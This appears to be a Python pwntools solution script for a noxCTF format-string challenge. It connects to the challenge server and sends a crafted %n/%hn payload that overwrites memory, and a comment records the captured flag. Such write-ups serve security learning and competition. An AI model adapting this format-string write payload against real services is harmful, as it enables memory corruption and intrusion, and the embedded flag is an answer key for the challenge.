"""

"""
# Imports
import re, sys, time
from pwn import *
# Set pwntools context to i386
context.update(arch='i386')


def main():
  """
  Runs on program execution.
  """
  # Local: 804890c.f7fc65a0.af17.ffffffff.2f.f7e20dc8.ffffd644 (0xffffd644 - 0xFFFFD58C = 184)
  # Remote: 804890c.f7fc95c0.be24d000.9.ffffdec7.f7e24049.ffffddc4  (0xffffddc4 - 184 = 0xffffdd0c)

  # Connect to remote challenge 
  p = remote('18.223.228.52', 13337)
  print p.recvuntil('But......... how ????')

  p.sendline(p32(0xffffdd0c) + p32(0x804A020) + '''%09$n%34419x%10$hn''')

  print p.recvuntil('}')
  
  # Flag = noxCTF{%N3ver_%7rust_%4h3_%F0rmat}


# Hook
if __name__ == '__main__':
  main()